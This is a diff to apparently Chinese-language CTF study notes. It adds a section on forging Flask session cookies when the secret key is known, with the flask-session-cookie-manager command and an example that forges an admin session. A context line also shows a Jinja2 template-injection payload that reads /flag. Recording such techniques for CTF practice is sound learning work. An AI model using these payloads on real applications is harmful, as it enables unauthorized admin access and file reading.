@@ -1961,6 +1961,21 @@ http://xxx/?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%}
 
 此时会返回 `/flag` 文件
 
+#### Flask Session 伪造
+
+- 条件：已知 key
+- 原理：Flask 的 Session 使用 key 加密后完全存储在前端，知道 key 的情况下可以伪造
+
+工具 https://github.com/noraj/flask-session-cookie-manager (缓存至 M1 的 `/Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Python渗透/flask-session-cookie-manager`)
+
+用法:
+
+```bash
+python3 flask_session_cookie_manager3.py encode -s "key值" -t "我们需要伪造的值"
+```
+
+示例如 `python3 flask_session_cookie_manager3.py encode -s 'LitCTF' -t '{"name":"admin"}'`
+
 #### Unserializer Pickle
 
 示例
